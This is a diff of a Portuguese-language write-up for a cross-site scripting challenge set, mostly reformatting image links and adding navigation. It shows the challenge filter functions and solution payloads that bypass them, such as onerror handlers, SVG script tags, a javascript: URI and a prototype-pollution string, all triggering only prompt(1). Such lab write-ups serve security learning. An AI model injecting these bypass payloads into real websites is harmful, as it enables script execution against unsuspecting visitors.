@@ -22,7 +22,7 @@ O site possui 16 desafios sendo classificados de `0 a 9` e de `A a F`
 ### desafio 0
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_0❌.png'></center>
-	Codigo
+	Código
 ```
 function escape(input) {
     // warm up
@@ -36,7 +36,7 @@ function escape(input) {
 [Ir para a resolução do 0º desafio](#0º-desafio)
 ### desafio 1
 
-![[Atividade_1❌.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_1❌.png'></center>
 	Código 
 ```
 function escape(input) {
@@ -48,12 +48,11 @@ function escape(input) {
     return '<article>' + input + '</article>';
 }
 ```
-
-
+		
 
 [Ir para a resolução do 1º desafio](#1º-desafio)
 ### desafio 2
-![[Atividade_2❌.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_2❌.png'></center>
 
 ```
 function escape(input) {
@@ -70,7 +69,7 @@ function escape(input) {
 
 ### desafio 3
 
-![[Atividade_3❌.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_3❌.png'></center>
 
 ```
 function escape(input) {
@@ -90,7 +89,7 @@ function escape(input) {
 
 [Ir para a resolução do 4º desafio](#4º-desafio)
 ### desafio 5
-![[Atividade_5❌.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_5❌.png'></center>
 
 ```
 function escape(input) {
@@ -111,7 +110,7 @@ function escape(input) {
 
 [Ir para a resolução do 6º desafio](#6º-desafio)
 ### desafio 7
-![[Atividade_7❌.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_7❌.png'></center>
 
 ```
 function escape(input) {
@@ -125,7 +124,7 @@ function escape(input) {
 ```
 [Ir para a resolução do 7º desafio](#7º-desafio)
 ### desafio 8
-![[Atividade_8❌.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_8❌.png'></center>
 
 ```
 function escape(input) {
@@ -148,7 +147,7 @@ function escape(input) {
 
 [Ir para a resolução do 9º desafio](#9º-desafio)
 ### desafio A
-![[Atividade_A❌.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_A❌.png'></center>
 
 ```
 function escape(input) {
@@ -165,7 +164,7 @@ function escape(input) {
 
 [Ir para a resolução do A desafio](#A-desafio)
 ### desafio B
-![[Atividade_B❌.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_B❌.png'></center>
 
 ```
 function escape(input) {
@@ -189,7 +188,7 @@ function escape(input) {
 ### desafio C
 
 
-![[Atividade_C❌.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_C❌.png'></center>
 
 ```
 function escape(input) {
@@ -205,7 +204,7 @@ function escape(input) {
 
 [Ir para a resolução do C desafio](#C-desafio)
 ### desafio D
-![[Atividade_D❌.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_D❌.png'></center>
 
 ```
  function escape(input) {
@@ -251,7 +250,7 @@ function escape(input) {
 [Ir para a resolução do E desafio](#E-desafio)
 ### desafio F
 
-![[Atividade_F❌.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_F❌.png'></center>
 ```
 function escape(input) {
     // sort of spoiler of level 7
@@ -274,7 +273,7 @@ function escape(input) {
 
 ### 0º desafio 
 
-![[Atividade_0✅.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_0✅.png'></center>
 
 
 ```
@@ -284,18 +283,21 @@ function escape(input) {
 * O `input` fecha o atributo `value` ("), abre e fecha a tag `<input>`, Depois vem a tag `<script>` injetada pelo usuário
 * Aquele trecho não aparece como texto na página ele é interpretado como um **bloco de código JavaScript real**, que roda no navegador de quem abrir a página.
 
+[Ir para o desafio 0](#desafio-0)
+
 ### 1º desafio 
 
-![[Atividade_1✅.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_1✅.png'></center>
 
 
 ```
 <img src="x" onerror="prompt(1)"
 ```
 
+[Ir para o desafio 1](#desafio-1)
 ### 2º desafio 
 
-![[Atividade_2✅.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_2✅.png'></center>
 ```
 <svg><script>prompt&#40;1)</script></b>
 ```
@@ -303,30 +305,35 @@ function escape(input) {
 ```
 HTML source: <svg><script>prompt&#40;1)</script></b>
 ```
+
+[Ir para o desafio 2](#desafio-2)
 ### 3º desafio 
 
-![[Atividade_3✅.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_3✅.png'></center>
 
 
 ```
 --!> <script>prompt(1)</script>
 ```
+
+[Ir para o desafio 3](#desafio-3)
 ### 4º desafio 
 
 
 ### 5º desafio 
 
-![[Atividade_5✅.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_5✅.png'></center>
 
 ```
 "type=image src onerror
 ="prompt(1)
 ```
 
+[Ir para o desafio 5](#desafio-5)
 
 ### 6º desafio
 
-![[Atividade_6✅.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_6✅.png'></center>
 
 
 
@@ -334,22 +341,26 @@ HTML source: <svg><script>prompt&#40;1)</script></b>
 javascript:prompt(1)#{"action":1}
 ```
 
-
+[Ir para o desafio 6](#desafio-6)
 ### 7º desafio
 
-![[Atividade_7✅.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_7✅.png'></center>
 
 
 ```
 "><svg/a=#"onload='/*#*/prompt(1)'
 ```
 
+[Ir para o desafio 7](#desafio-7)
+
 
 ### 8º desafio 
-![[Atividade_8✅.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_8✅.png'></center>
 ```
  prompt(1) -->
 ```
+
+[Ir para o desafio 8](#desafio-8)
 
 ### 9º desafio
 
@@ -358,44 +369,57 @@ javascript:prompt(1)#{"action":1}
 
 ### A desafio 
 
-![[Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_A✅.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_A✅.png'></center>
 
 
 ```
 p'rompt(1)
 ```
 
+[Ir para o desafio A](#desafio-A)
+
 
 ### B desafio 
 
 
-![[Atividade_B✅.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_B✅.png'></center>
 ```
 "(prompt(1))in"
 ```
 
+[Ir para o desafio B](#desafio-B)
+
 ### C desafio 
-![[Atividade_C✅.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_C✅.png'></center>
 
 ```
 eval(630038579..toString(30))(1)
 ```
+
+[Ir para o desafio C](#desafio-C)
+
 ### D desafio 
 
-![[Atividade_D✅.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_D✅.png'></center>
 
 ```
 {"source":"_-_invalid-URL_-_","__proto__":{"source":"$`onerror=prompt(1)>"}}
 ```
+
+[Ir para o desafio D](#desafio-D)
+
 ### E desafio 
 
 
 
 ### F desafio 
-![[Atividade_F✅.png]]
+<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_F✅.png'></center>
 ```
 "><svg><!--#--><script><!--#-->prompt(1<!--#-->)</script>
 ```
+
+[Ir para o desafio F](#desafio-F)
+
 
 ---
 
